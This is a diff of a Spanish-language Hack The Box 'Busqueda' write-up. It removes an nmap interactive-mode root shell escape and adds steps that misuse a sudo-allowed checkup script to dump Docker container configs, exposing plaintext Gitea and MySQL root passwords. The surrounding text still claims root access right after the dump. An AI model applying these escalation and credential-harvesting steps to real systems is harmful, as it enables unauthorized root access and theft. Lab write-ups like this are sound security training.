@@ -328,25 +328,35 @@ CONTAINER ID   IMAGE                COMMAND                  CREATED        STAT
 960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   5 months ago   Up 5 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
 f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   5 months ago   Up 5 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
 
-<span class="ve">svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 960873171e2e gitea</span>
+<span class="ve">svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect</span>
 Usage: /opt/scripts/system-checkup.py docker-inspect <format>
-960873171e2e
 
 <span class="ve">svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span>
 Something went wrong
 </code></pre></div></div><br>
 
-<p class="plain-text">Pretendemos spawnear una shell interactiva a través de la ejecución de nmap y al estar haciéndolo como root tomaremos su identidad dentro de la nueva shell.</p>
-<p class="plain-text">Identificamos que la versión de nmap 3.81 está dentro del rango susceptible a violaciones de seguridad mediante el spawneo de shells interactivas así que vamos a ello.</p>
+<p class="plain-text">Volvemos al navegador y hacemos una búsqueda sobre "docker-inspect" para ver de que forma tenemos que usarlo.</p>
+<a href="/htb/busqueda/6.png" target="_blank"><div><p><img src="/htb/busqueda/6.png"></p></div></a>
+<p class="plain-text">Vamos a inspeccionar los dockers gitea y mysql respectivamente cogiendo su ID del comando anterior docker-ps</p>
+
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-robot@linux:~$ nmap --interactive
-Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
-Welcome to Interactive Mode -- press h enter for help
-<span class="am">nmap> !sh</span>
-# whoami
-<span class="ve">root</span>
-#
+<span class="ve">svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e</span>
+{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,
+"Env":["<span class="ro">USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
+"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,"USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},
+"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
+"com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml",
+"com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":
+"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
+
+<span class="ve">svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a</span>
+{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,
+"Env":["<span class="ro">MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,"GOSU_VERSION=1.14",
+"MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,
+"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker",
+"com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
+
 </code></pre></div></div><br>
 
 <p class="plain-text">¡Voilà! Nos hemos convertido root, ahora tenemos acceso completo al sistema. Lo primero que haremos es acceder a la carpeta root para ver que encontramos dentro.</p>
